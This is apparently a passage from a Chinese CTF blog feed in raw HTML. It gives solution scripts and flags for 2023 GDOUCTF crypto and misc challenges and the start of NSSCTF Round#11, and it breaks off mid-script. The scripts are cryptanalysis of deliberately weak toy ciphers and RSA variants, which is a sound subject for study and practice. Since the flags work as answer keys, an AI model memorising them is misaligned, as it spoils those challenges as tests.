operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'w'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'e'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'9'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'g'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'z'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'d'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'~'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'7'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'='</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'8'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'x'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'9'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'j'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">':'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'@'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'4'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'`'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'l'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'6'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'n'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">';'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'\''</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'r'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'k'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'`'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'p'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'\"'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'&#123;'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'&amp;'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'\\'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'.'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'%'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'|'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">','</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'@'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'&#123;'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'u'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'7'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'y'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'a'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>            hasInvalidCharacter <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hasInvalidCharacter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The decrypted string contains invalid characters."</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>encryptedString<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>#flag<span class="token punctuation">&#123;</span>c0rrectly_decrypted_the_$ecret_flag_encrypted_with_5up3r_easy_b@by_encryp7ion_alg0r<span class="token operator">!</span>thm_written_in_vanil1a_js<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="babylua"><a href="#babylua" class="headerlink" title="babylua"></a>babylua</h2><p>交给chatgpt了，看不懂lua</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">recover_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        seed <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        md5_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>seed<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        key <span class="token operator">=</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"b5e62abe84"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> key<span class="token comment">#key = recover_key()</span><span class="token comment">#print(key)</span>key <span class="token operator">=</span> <span class="token string">'b5e62abe84bc8afbfd97c91a15aa0867'</span>encrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt_flag</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flagflag <span class="token operator">=</span> decrypt_flag<span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#flag&#123;He11o_Lua!!!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Magic-of-Encoding"><a href="#Magic-of-Encoding" class="headerlink" title="Magic of Encoding"></a>Magic of Encoding</h2><p>依次删除里面的干扰flag，，，，，建议下次仍杂项</p><p>得到一个压缩包</p><p><img src="/2023/04/16/2023-GDOUCTF/55503bdb8d8f6005db3dce12baebdb0.png" alt="55503bdb8d8f6005db3dce12baebdb0"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;h0p3_y0u_lik3d_the_M4gic_7rick&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Math-Problem"><a href="#Math-Problem" class="headerlink" title="Math Problem"></a>Math Problem</h2><p>coppersmith解出x，再f和n求gcd即是p</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sage</span>a <span class="token operator">=</span> <span class="token number">9303981927028382051386918702900550228062240363697933771286553052631411452412621158116514735706670764224584958899184294505751247393129887316131576567242619</span>b <span class="token operator">=</span> <span class="token number">9007779281398842447745292673398186664639261529076471011805234554666556577498532370235883716552696783469143334088312327338274844469338982242193952226631913</span>y <span class="token operator">=</span> <span class="token number">970090448249525757357772770885678889252473675418473052487452323704761315577270362842929142427322075233537587085124672615901229826477368779145818623466854</span>n <span class="token operator">=</span> <span class="token number">79239019133008902130006198964639844798771408211660544649405418249108104979283858140199725213927656792578582828912684320882248828512464244641351915288069266378046829511827542801945752252863425605946379775869602719406340271702260307900825314967696531175183205977973427572862807386846990514994510850414958255877</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> a<span class="token operator">*</span>x <span class="token operator">+</span>b <span class="token operator">-</span> y<span class="token operator">**</span><span class="token number">2</span>f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>x0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">64</span><span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>epsilon<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x0<span class="token punctuation">)</span>x0<span class="token operator">=</span><span class="token number">9757458594430450711</span>f <span class="token operator">=</span> x0<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> a<span class="token operator">*</span>x0 <span class="token operator">+</span>b <span class="token operator">-</span> y<span class="token operator">**</span><span class="token number">2</span>p <span class="token operator">=</span> GCD<span class="token punctuation">(</span>f<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>c <span class="token operator">=</span> <span class="token number">45457869965165575324534408050513326739799864850578881475341543330291990558135968254698676312246850389922318827771380881195754151389802803398367341521544667542828862543407738361578535730524976113729406101764290984943061582342991118766322793847422471903811686775249409300301726906738475446634950949059180072008</span>q <span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token comment">#print(n//p)</span>d<span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">[9757458594430450711]b&#39;flag&#123;c4edd6d0-d1b3-cbda-95e3-a323edc35be5&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>关注公众号，回复签到得flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;CHAITIN_x_GDOUCTF2023&#125;签到成功 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2023GDOUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#11</title>
      <link href="/2023/04/09/NSSCTF-Round-11/"/>
      <url>/2023/04/09/NSSCTF-Round-11/</url>
      
        <content type="html"><![CDATA[<p>本次round好多交互，这种类型得脚本写的比较少，参考了一些大佬的脚本</p><h1 id="ez-enc"><a href="#ez-enc" class="headerlink" title="ez_enc"></a>ez_enc</h1><pre class="line-numbers language-none"><code class="language-none">ABAABBBAABABAABBABABAABBABAAAABBABABABAAABAAABBAABBBBABBABBABBABABABAABBAABBABAAABBAABBBABABABAAAABBAAABABAABABBABBBABBAAABBBAABABAABBAAAABBBAAAABAABBBAABBABABAABABAAAAABBBBABAABBBBAAAABBBBBAB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示不是培根密码</p><p>直接ciphey一把梭</p><p><img src="/2023/04/09/NSSCTF-Round-11/image-20230408104303610.png" alt="image-20230408104303610"></p><p>NSSCTF{mS4gT1Kv9L8NjPzx}</p><p>或者B–&gt;1,A–&gt;0，然后转文本</p><h1 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token keyword">assert</span> p <span class="token operator">></span> qn <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65536</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>num1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">pow</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> nnum2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token operator">-</span>q<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num1="</span><span class="token punctuation">,</span>num1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num2="</span><span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>分析：</p><p>$num1  \equiv p^e  -  q^e mod n$</p><p>$num2  \equiv  (p-q)^e \equiv  p^e + q^e   mod  n$</p><p>$num1 + num2  \equiv 2p^e   mod  n$</p><p>将上式与n求gcd即可分解n<br>特殊的地方在e&#x3D;65536，观察可以得到这里p q都是4k+3型素数，想到是rabin的变式，进行16次rabin算法即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">num1<span class="token operator">=</span> <span class="token number">24878810498817248549601963074742685387386464942462157441627831559105735510922831745148498491917305807763652117589000468102621763100124920892363322194429534963670648950723660355117500201845429921299091570150674940239532169196783311708023321903390056373346462408338127956230246368885082072149299468189613330701</span>num2<span class="token operator">=</span> <span class="token number">56042767418908338314258886089384708269108770192686490541655734563698206477690563665417949934725233235902569236157929677765439019670917433092766376185064198413489357059092974054470881454103094970536553398696049799479326484291184241512583550559743820850066081694272753995204856617490081525492534694894128803854</span>n<span class="token operator">=</span> <span class="token number">82787523645374032053495210843370017123931172377557271655638312997792541298388666815392709656552641860759854061080381255745530793945458793925964239003822125725989147047931146084256499955384247979600706446509819528773207269723034851995962510261418309720723966938718829746368418522291444193759059939732595711529</span>c<span class="token operator">=</span> <span class="token number">34003458028770944852041095267110206438297243701089262869163250699264377890408968607261710243439051430361829201875786192841340344437449619791066464678110573083728216440444967701968867091815499710925753219016250452889993999986949308467638206737284082995045112478010799884241546145302576780928007895589838096434</span>e<span class="token operator">=</span><span class="token number">65536</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> GCD<span class="token punctuation">(</span>num1<span class="token operator">+</span>num2<span class="token punctuation">,</span>n<span class="token punctuation">)</span>q <span class="token operator">=</span> n<span class="token operator">//</span>px0<span 